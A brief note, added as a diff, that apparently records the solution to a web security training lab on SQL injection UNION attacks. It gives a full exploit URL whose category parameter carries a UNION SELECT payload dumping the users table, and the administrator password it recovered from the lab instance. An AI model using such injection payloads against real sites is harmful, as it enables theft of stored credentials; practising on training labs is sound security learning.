@@ -1,0 +1,7 @@
+Lab: SQL injection UNION attack, retrieving data from other tables
+
+The database contains a different table called users, with columns called username and password.
+
+Successfull union sql attack: https://acad1f411e817f6ac04094040088008e.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20*%20from%20users--
+
+administrator password: dletfzfv2sdhtfnpfkfc
